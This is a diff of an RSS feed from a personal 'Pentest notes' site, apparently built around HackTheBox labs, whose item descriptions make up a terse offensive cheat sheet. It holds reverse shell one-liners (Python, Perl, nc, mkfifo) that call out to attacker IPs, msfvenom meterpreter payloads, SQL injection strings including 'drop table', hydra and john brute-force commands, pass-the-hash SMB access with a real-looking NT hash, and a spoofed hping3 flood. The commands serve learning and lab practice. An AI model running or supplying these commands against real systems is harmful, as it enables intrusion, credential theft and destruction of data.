@@ -2,56 +2,56 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Tools on Pentest notes</title>
-    <link>https://example.com/categories/tools/</link>
+    <link>https://sosprz.github.io/categories/tools/</link>
     <description>Recent content in Tools on Pentest notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Sat, 19 Jan 2019 22:13:07 +0100</lastBuildDate>
     
-	<atom:link href="https://example.com/categories/tools/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://sosprz.github.io/categories/tools/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Fuzz</title>
-      <link>https://example.com/posts/fuzz/</link>
+      <link>https://sosprz.github.io/posts/fuzz/</link>
       <pubDate>Sat, 19 Jan 2019 22:13:07 +0100</pubDate>
       
-      <guid>https://example.com/posts/fuzz/</guid>
+      <guid>https://sosprz.github.io/posts/fuzz/</guid>
       <description>wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d &#34;username=FUZZ&amp;password=pass&#34; -hs &#34;not found&#34; http://10.10.10.10/login.php wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -b PHPSESSID=096qe8a48h34hp3d3gfgr3cfr5 --hh 375 http://docker.hackthebox.eu:38821/panel.php?info=FUZZ  Fuzzing with ZAP request -&amp;gt; right click –&amp;gt; attack –&amp;gt; fuzzer</description>
     </item>
     
     <item>
       <title>Impacket</title>
-      <link>https://example.com/posts/impacket/</link>
+      <link>https://sosprz.github.io/posts/impacket/</link>
       <pubDate>Sat, 19 Jan 2019 22:13:07 +0100</pubDate>
       
-      <guid>https://example.com/posts/impacket/</guid>
+      <guid>https://sosprz.github.io/posts/impacket/</guid>
       <description>Impacket psexec.py administrator@10.10.10.10</description>
     </item>
     
     <item>
       <title>Antivirus evasion</title>
-      <link>https://example.com/posts/antivirus-evasion/</link>
+      <link>https://sosprz.github.io/posts/antivirus-evasion/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/antivirus-evasion/</guid>
+      <guid>https://sosprz.github.io/posts/antivirus-evasion/</guid>
       <description>https://github.com/oddcod3/Phantom-Evasion</description>
     </item>
     
     <item>
       <title>Backdoor</title>
-      <link>https://example.com/posts/backdoor/</link>
+      <link>https://sosprz.github.io/posts/backdoor/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/backdoor/</guid>
+      <guid>https://sosprz.github.io/posts/backdoor/</guid>
       <description>TheFatRat</description>
     </item>
     
     <item>
       <title>Domain tools</title>
-      <link>https://example.com/posts/domain/</link>
+      <link>https://sosprz.github.io/posts/domain/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/domain/</guid>
+      <guid>https://sosprz.github.io/posts/domain/</guid>
       <description>sublist3r
 #vhost enum nmap &amp;ndash;script http-vhosts -p 80,443 10.10.10.113 
  git clone https://github.com/jobertabma/virtual-host-discovery ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  </description>
@@ -59,20 +59,20 @@
     
     <item>
       <title>Metasploit</title>
-      <link>https://example.com/posts/metasploit/</link>
+      <link>https://sosprz.github.io/posts/metasploit/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/metasploit/</guid>
+      <guid>https://sosprz.github.io/posts/metasploit/</guid>
       <description>#ssh user enum search enumusers use options set USER_FILE run 
 #php, image reverse shell #php4,php5  msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 lport=8888 -f raw msfconsole handler -p php/meterpreter/reverse_tcp -P 8888 -H 192.168.0.1</description>
     </item>
     
     <item>
       <title>Nmap</title>
-      <link>https://example.com/posts/nmap/</link>
+      <link>https://sosprz.github.io/posts/nmap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/nmap/</guid>
+      <guid>https://sosprz.github.io/posts/nmap/</guid>
       <description>nmap -sC -sV -oA nmap/hostname ip nmap -c -v -max-retires=0 -t5 -p- 10.10.10.10  nmap &amp;ndash;script smb-brute.nse -p445 ip
 nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hostname ip nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip 
  nmap -p 80 &amp;ndash;script http-shellshock &amp;ndash;script-args uri=/cgi-bin/vulnscript.sh ip nmap -p 3306 &amp;ndash;script mysql-brute ip nmap -sV &amp;ndash;script=http-enum ip nmap -sV &amp;ndash;script=nfs-showmount ip nmap -sV &amp;ndash;script ssl-enum-ciphers -p 443 ip nmap -p445 &amp;ndash;script smb-vuln-ms17-010 ip nmap &amp;ndash;script smb-brute.</description>
@@ -80,19 +80,19 @@ nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hos
     
     <item>
       <title>OpenSSL</title>
-      <link>https://example.com/posts/openssl/</link>
+      <link>https://sosprz.github.io/posts/openssl/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/openssl/</guid>
+      <guid>https://sosprz.github.io/posts/openssl/</guid>
       <description>https://github.com/glv2/bruteforce-salted-openssl</description>
     </item>
     
     <item>
       <title>Passwords</title>
-      <link>https://example.com/posts/password/</link>
+      <link>https://sosprz.github.io/posts/password/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/password/</guid>
+      <guid>https://sosprz.github.io/posts/password/</guid>
       <description>#john
 john &amp;ndash;format=crypt &amp;ndash;wordlist=rockyou.txt &amp;ndash;session=two hashes.txt john &amp;ndash;format=NT &amp;ndash;rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
 john &amp;ndash;format=netntlmv2 hash.txt &amp;ndash;wordlist=/usr/share/wordlists/rockyou.txt #hydra hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form &amp;lsquo;/index.php:password=^PASS^:F=Invalid password!&amp;rsquo; hydra -L users -P passwords 10.10.10.111 ssh hydra 10.10.10.153 http-post-form &amp;ldquo;/moodle/login/index.php:username=^USER^&amp;amp;password=^PASS^:F=Invalid login, please try again&amp;rdquo; -l giovanni -P list -t 10 -w 30 hash-identifier
@@ -101,38 +101,38 @@ john &amp;ndash;format=netntlmv2 hash.txt &amp;ndash;wordlist=/usr/share/wordlis
     
     <item>
       <title>Python</title>
-      <link>https://example.com/posts/python/</link>
+      <link>https://sosprz.github.io/posts/python/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/python/</guid>
+      <guid>https://sosprz.github.io/posts/python/</guid>
       <description>cat users.txt | python -m json.tool
 python -m SimpleHTTPServer 8000</description>
     </item>
     
     <item>
       <title>Reverse-engineering</title>
-      <link>https://example.com/posts/reverse-engineering/</link>
+      <link>https://sosprz.github.io/posts/reverse-engineering/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/reverse-engineering/</guid>
+      <guid>https://sosprz.github.io/posts/reverse-engineering/</guid>
       <description>radare2</description>
     </item>
     
     <item>
       <title>SMB</title>
-      <link>https://example.com/posts/smb/</link>
+      <link>https://sosprz.github.io/posts/smb/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/smb/</guid>
+      <guid>https://sosprz.github.io/posts/smb/</guid>
       <description>smbclient #user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY -L 10.10.10.107 #Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY \\\\10.10.10.107\\alice  smbmap smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com -R smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com --download file crackmapexec crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;shares</description>
     </item>
     
     <item>
       <title>SQLi</title>
-      <link>https://example.com/posts/sqli/</link>
+      <link>https://sosprz.github.io/posts/sqli/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/sqli/</guid>
+      <guid>https://sosprz.github.io/posts/sqli/</guid>
       <description>#sql injection userName = Smith&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1 userName =&amp;rsquo; or 1=1 &amp;ndash; userID = 1234567 or 1=1 UserName = Smith’;drop table users; truncate audit_log;&amp;ndash;
 User&amp;rsquo;+&amp;rsquo;
 
@@ -141,39 +141,39 @@ Themole</description>
     
     <item>
       <title>SSH</title>
-      <link>https://example.com/posts/ssh/</link>
+      <link>https://sosprz.github.io/posts/ssh/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/ssh/</guid>
+      <guid>https://sosprz.github.io/posts/ssh/</guid>
       <description>#putty puttygen my_private_key.ppk -O private-openssh -o keyfile
 #ssh ssh -i keyfile root@10.10.10.107 doas -u userca /usr/bin/ssh-keygen -v -s /home/userca/ca -I alice1978 -n emergencybackup -V +1w -z 1 id_rsa.pub</description>
     </item>
     
     <item>
       <title>Shell</title>
-      <link>https://example.com/posts/shell/</link>
+      <link>https://sosprz.github.io/posts/shell/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/shell/</guid>
+      <guid>https://sosprz.github.io/posts/shell/</guid>
       <description> export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python -c import pty; pty.spawn(&#34;/bin/bash&#34;) python3 -c import pty; pty.spawn(&#39;/bin/bash&#39;) echo os.system(&#39;/bin/bash&#39;) /bin/sh -i echo &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;  /tmp/asdf.py python /tmp/asdf.py  </description>
     </item>
     
     <item>
       <title>Shell escape</title>
-      <link>https://example.com/posts/shell-esc/</link>
+      <link>https://sosprz.github.io/posts/shell-esc/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/shell-esc/</guid>
+      <guid>https://sosprz.github.io/posts/shell-esc/</guid>
       <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash
 tar cf /dev/null ~/b &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/bin/bash</description>
     </item>
     
     <item>
       <title>Shell reverse</title>
-      <link>https://example.com/posts/shell-reverse/</link>
+      <link>https://sosprz.github.io/posts/shell-reverse/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/shell-reverse/</guid>
+      <guid>https://sosprz.github.io/posts/shell-reverse/</guid>
       <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
@@ -187,29 +187,29 @@ ipv6  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 |
     
     <item>
       <title>Sqlmap</title>
-      <link>https://example.com/posts/sqlmap/</link>
+      <link>https://sosprz.github.io/posts/sqlmap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/sqlmap/</guid>
+      <guid>https://sosprz.github.io/posts/sqlmap/</guid>
       <description>&amp;ndash;dbs &amp;ndash;tables -D &amp;ndash;columns -D master -T sys.master_key_passwords &amp;ndash;dump -D master -T sys.master_key_passwords -f -b &amp;ndash;current-db &amp;ndash;current-user &amp;ndash;users &amp;ndash;passwords -v 1
 sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 &amp;ndash;sql-query=&amp;ldquo;EXEC master..xp_dirtree &amp;lsquo;\\10.10.18.70\test&amp;rsquo; &amp;ndash; &amp;ldquo;</description>
     </item>
     
     <item>
       <title>Stego</title>
-      <link>https://example.com/posts/stego/</link>
+      <link>https://sosprz.github.io/posts/stego/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/stego/</guid>
+      <guid>https://sosprz.github.io/posts/stego/</guid>
       <description> Steghide steghide info file steghide export -sf file.jpg Foremost foremost -i file Strings strings file Binwalk binwalk file binwalk -e file Stegsolve https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve Wavsteg python3 WavSteg.py -r -s soundfile -o outputfile Stegcracker ./stegcracker ../../Hackthebox/Stego/beatles/BAND.JPG ../../app/rockyou.txt Unicode https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder Nipiet online https://www.bertnase.de/npiet/npiet-execute.php Decode online http://dcode.fr  </description>
     </item>
     
     <item>
       <title>Tools</title>
-      <link>https://example.com/posts/tools/</link>
+      <link>https://sosprz.github.io/posts/tools/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/tools/</guid>
+      <guid>https://sosprz.github.io/posts/tools/</guid>
       <description>CMSeeK CMS Detection and Exploitation suite
 Responder responder -i tun0
 Hping3 hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 &amp;ndash;flood
@@ -219,20 +219,20 @@ https://github.com/diego-treitos/linux-smart-enumeration https://github.com/joao
     
     <item>
       <title>Tunnels</title>
-      <link>https://example.com/posts/tunnels/</link>
+      <link>https://sosprz.github.io/posts/tunnels/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/tunnels/</guid>
+      <guid>https://sosprz.github.io/posts/tunnels/</guid>
       <description>Chisel  chisel 
 Proxychains  proxychinas</description>
     </item>
     
     <item>
       <title>Web Servers</title>
-      <link>https://example.com/posts/web-servers/</link>
+      <link>https://sosprz.github.io/posts/web-servers/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/web-servers/</guid>
+      <guid>https://sosprz.github.io/posts/web-servers/</guid>
       <description>dirb -h cewl seclists gobuster -u http://10.10.10.111:1880 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster -u http://10.10.10.111:9999/backup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #with -x -m it will be search txt,html gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x -m gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x html  Recirsive Gobuster https://github.com/epi052/recursive-gobuster
 Skipfish is an active web application security reconnaissance tool. skipfish -o /root/test/ -S /usr/share/skipfish/dictionares
 Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</description>
@@ -240,10 +240,10 @@ Uniscan is a simple Remote File Include, Local File Include and Remote Command E
     
     <item>
       <title>XSS</title>
-      <link>https://example.com/posts/xss/</link>
+      <link>https://sosprz.github.io/posts/xss/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/xss/</guid>
+      <guid>https://sosprz.github.io/posts/xss/</guid>
       <description>xsser -u</description>
     </item>
     
